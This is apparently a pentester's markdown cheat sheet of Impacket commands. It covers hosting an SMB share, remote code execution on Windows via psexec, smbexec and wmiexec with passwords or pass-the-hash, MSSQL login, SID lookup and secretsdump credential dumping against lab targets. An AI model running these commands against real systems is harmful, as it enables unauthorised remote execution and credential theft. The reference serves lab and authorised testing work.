# Impacket Tools

## Impacket SMBServer
```
$sudo python3 impacket-smbserver -u <username> -p <password> <name of share> <location of share>
$sudo python3 impacket-smbserver -smb2support -u <username> -p <password> <name of share> <location of share>
$sudo impacket-smbserver -smb2support <name of share> `pwd`
$sudo python3 smbserver.py -smb2support files $(pwd) -username test -password test

Sample Usage: $python3 impacket-smbserver -u myusername -p secretpassword myshare $(pwd)
Tip: use $(pwd) for the current working  directory
```

## PSExec
```
[Sample Usage] python3 psexec.py Administrator@10.10.10.10 (enter password when prompted)
[PWD Auth] python3 psexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
[PTH] python3 psexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
```

## SMBExec
```
[Sample Usage] python3 smbexec.py Administrator@10.10.10.10 (enter password when prompted)
[PWD Auth] python3 smbexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
[PTH] python3 smbexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
```

## WMIExec
```
[Sample Usage] python3 wmiexec.py Administrator@10.10.10.10 (enter password when prompted)
[PWD Auth] python wmiexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
[PTH] python wmiexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
```

## MSSQLClient
```
$python3 mssqlclient.py -port 1433 -db volume -windows-auth <username>@<ip address>
```

## WMIExec
```
$python3 wmiexec.py <username@hostname>
$python3 wmiexec.py <username:password@hostname>
```

## LookupSID
```
$python3 lookupsid.py <domain/username@hostname>
$python3 lookupsid.py <domain/username:password@hostname>
```

## SecretsDumping
```
python secretsdump.py htb.local/Administrator@reel.htb.local (enter password when prompted)
```